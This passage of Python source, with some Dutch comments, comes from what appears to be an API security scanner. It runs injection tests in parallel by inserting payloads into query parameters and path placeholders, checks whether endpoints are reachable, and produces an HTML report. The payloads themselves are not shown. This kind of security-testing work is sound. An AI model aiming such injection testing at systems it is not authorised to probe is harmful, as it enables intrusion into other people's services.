                            self._run_injection_tests_parallel, ep, t
                        ))
                    
                    # Schedule tasks
                    for fn in test_fns:
                        if stop_requested.is_set():
                            break
                        all_tasks.append(main_executor.submit(fn))
                
                # Process results with progress tracking
                for future in as_completed(all_tasks):
                    if stop_requested.is_set():
                        print(f"{Fore.YELLOW}[!] Scan stopped by user during main scan{Style.RESET_ALL}")
                        # Annuleer resterende taken
                        for task in all_tasks:
                            task.cancel()
                        break
                        
                    try:
                        future.result(timeout=self.timeout * 20)  # Longer timeout
                    except concurrent.futures.TimeoutError:
                        self._log("Test timeout", "N/A", "Medium")
                    except Exception as e:
                        self._log(f"Test failed", str(e), "Medium")
                    finally:
                        pbar.update(1)

        print(f"{Fore.CYAN}[INFO] Scan completed. Found {len(self.issues)} issues.{Style.RESET_ALL}")
        return self.issues

    def _run_injection_tests_parallel(self, endpoint: str, test_type: str):
        if stop_requested.is_set():
            return

        payloads = self.INJECTION_PAYLOADS[test_type]
        test_urls = []
        
        # Bepaal voorkeursmethode voor dit endpoint
        method_preference = "POST" if "/posts" in endpoint else "auto"
        
        # Genereer test URLs
        for p in payloads:
            if stop_requested.is_set():
                return
            test_url = f"{endpoint}?input={urlparse.quote(p)}"
            test_urls.append((test_url, method_preference))
            test_urls.append((endpoint.replace("%7BpostId%7D", urlparse.quote_plus(p)),"GET"))
        
        # Dynamic worker count
        workers = min(8, max(1, len(payloads)))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            # Controleer op stop-request voor het starten
            if stop_requested.is_set():
                return
                
            # Voeg taken toe
            futures = []
            for test_url, method in test_urls:
                if stop_requested.is_set():
                    break
                futures.append(executor.submit(self._test_injection, test_url, test_type, method))
            
            # Verwerk resultaten met stop-controle
            for future in concurrent.futures.as_completed(futures):
                if stop_requested.is_set():
                    for f in futures:
                        f.cancel()
                    return
                try:
                    future.result()
                except Exception:
                    pass  # Fouten worden al gelogd

    def _is_endpoint_reachable(self, endpoint: str) -> bool:
        """Improved reachability check with HEAD/GET"""
        try:
            # Try HEAD first (faster)
            resp = self.session.head(
                endpoint, 
                timeout=self.timeout,
                allow_redirects=False
            )
            
            if resp.status_code in (405, 501):  # HEAD not supported
                resp = self.session.get(
                    endpoint, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            return resp.status_code != 404
        except requests.RequestException:
            return False
        
    def generate_report(self) -> str:
        """Generate an HTML report"""
        gen = ReportGenerator(
            issues=self.issues,
            scanner="SafeConsumption (API10)",
            base_url=self.base_url
        )
        return gen.generate_html()

    def save_report(self, path: str) -> None:
        """Save HTML report to path"""
        Path(path).write_text(self.generate_report(), encoding="utf-8")